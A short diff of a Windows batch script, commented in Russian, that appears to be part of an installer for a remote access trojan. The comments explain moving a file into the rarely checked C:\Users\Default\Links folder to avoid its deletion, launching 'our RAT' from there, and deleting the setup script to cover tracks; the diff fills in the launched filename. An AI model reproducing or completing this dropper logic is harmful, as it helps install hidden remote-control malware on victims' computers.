@@ -15,7 +15,7 @@ rem Устанавливает дополнительную библиотеку
 move *** C:\Users\Default\Links
 rem Переносит файл в скрытую и обычно никому не нужную папку, что позволит избежать удаления файла.
 rem Замените *** на название файла из 9 строки.
-start C:\Users\Default\Links\***
+start C:\Users\Default\Links\setup_64_comment.bat
 rem Выполняет скрипт нашего RAT.
 rem Замените *** на название файла из 9 строки.
 del setup_64_comment.bat
